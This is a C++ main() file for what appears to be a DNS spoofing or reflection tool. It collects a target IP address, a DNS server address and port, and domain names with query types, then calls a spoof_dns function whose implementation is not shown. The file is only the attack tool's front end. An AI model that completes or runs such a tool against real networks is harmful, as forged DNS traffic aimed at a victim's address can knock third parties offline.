#include <iostream>
#include <string>
#include "utils.h"

int main(int argc, char *argv[])
{
  std::string target_ip_str;
  std::cout << "Target ip address: ";
  do{
    std::cin >> target_ip_str;
  } while(utils::is_bad_ipv4_addr(target_ip_str) && std::cout << "Bad IPv4 address, please retry: ");
  
  std::string dns_server_ip_str;
  std::cout << "DNS server ip address: ";
  do{
    std::cin >> dns_server_ip_str;
  } while(utils::is_bad_ipv4_addr(dns_server_ip_str) && std::cout << "Bad IPv4 address, please retry: ");

  unsigned short dns_server_port;
  std::cout << "DNS server port: ";
  do{
    std::cin >> dns_server_port;
  } while(utils::is_bad_ipv4_port(dns_server_port) && std::cout << "Bad IPv4 port, please retry: ");

  std::vector<std::string> domain_strings;
  std::vector<utils::DNSQueryType> query_types;
  std::string domain_input;
  while(std::cout << "Query domain name(Ctrl+D to end): " && std::getchar() && std::getline(std::cin, domain_input)) {
    int16_t query_type;
    domain_strings.emplace_back(domain_input);
    std::cout << "Query type(A = 1, NS = 2, CNAME = 5, MX = 15, TXT = 16 , AAAA = 28): ";
    std::cin >> query_type;
    query_types.emplace_back(static_cast<utils::DNSQueryType>(query_type));
  }
  std::cout << std::endl;

  utils::spoof_dns(target_ip_str, dns_server_ip_str, dns_server_port, domain_strings, query_types);
  return 0;
}
